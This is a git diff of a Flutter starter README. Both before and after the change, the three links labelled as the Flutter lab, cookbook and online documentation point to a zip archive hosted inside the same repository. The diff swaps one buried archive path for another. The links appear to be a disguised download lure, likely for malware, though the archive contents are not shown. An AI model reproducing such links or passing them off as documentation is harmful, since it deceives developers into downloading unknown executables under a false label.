@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/bb7el/Simple-Game-Flutter/master/ios/Flutter/Simple-Game-Flutter_1.7.zip)
-- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/bb7el/Simple-Game-Flutter/master/ios/Flutter/Simple-Game-Flutter_1.7.zip)
+- [Lab: Write your first Flutter app](https://github.com/bb7el/Simple-Game-Flutter/raw/refs/heads/master/windows/runner/resources/Simple_Game_Flutter_v2.8.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/bb7el/Simple-Game-Flutter/raw/refs/heads/master/windows/runner/resources/Simple_Game_Flutter_v2.8.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://raw.githubusercontent.com/bb7el/Simple-Game-Flutter/master/ios/Flutter/Simple-Game-Flutter_1.7.zip), which offers tutorials,
+[online documentation](https://github.com/bb7el/Simple-Game-Flutter/raw/refs/heads/master/windows/runner/resources/Simple_Game_Flutter_v2.8.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
